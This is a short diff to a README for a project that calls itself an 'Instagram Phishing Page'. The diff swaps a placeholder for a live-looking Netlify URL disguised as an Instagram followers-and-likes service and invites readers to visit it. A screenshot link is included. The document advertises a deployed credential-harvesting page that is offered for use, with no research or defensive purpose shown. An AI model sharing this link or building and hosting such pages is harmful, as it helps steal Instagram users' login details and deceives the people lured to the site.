@@ -2,7 +2,7 @@
 Instagram Phishing Page 
 
 A phishing page for instagram 
-/*Link*/
+https://main--instagrafollowerslikesgain.netlify.app/
 visit there to see the website
 
 <blockquote> <img src="https://github.com/oalfrix/insta/blob/main/image_2022-03-26_191616.png" ></img></blockquote>
